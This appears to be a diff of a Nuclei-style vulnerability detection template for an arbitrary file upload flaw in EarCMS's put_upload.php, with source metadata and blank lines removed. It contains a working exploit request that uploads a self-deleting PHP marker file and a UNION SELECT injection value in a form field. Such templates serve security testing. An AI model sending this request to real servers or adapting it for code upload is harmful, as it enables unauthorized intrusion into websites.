@@ -3,20 +3,14 @@ info:
   name: EarCMS put_upload.php 任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ixsd630dbr6y0hmn'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ixsd630dbr6y0hmn
-    fofa: app="EearCMS"
 http:
 - raw:
   - 'POST /source/index/put_upload.php HTTP/1.1
 
 
     Content-Type: multipart/form-data;boundary=---------------------------51564987891651984798165156489
-
-
 
 
     -----------------------------51564987891651984798165156489
@@ -28,8 +22,6 @@ http:
     Content-Type: application/x-msdownload
 
 
-
-
     <?php echo "dudesuite";unlink(__FILE__);?>
 
 
@@ -39,8 +31,6 @@ http:
     Content-Disposition: form-data; name="id"
 
 
-
-
     -1  union SELECT "dudesuite.php";
 
 
@@ -48,8 +38,6 @@ http:
 
 
     Content-Disposition: form-data; name="pw"
-
-
 
 
     month-cf3b79c6e54ca7a8d50cdc8aedcde407
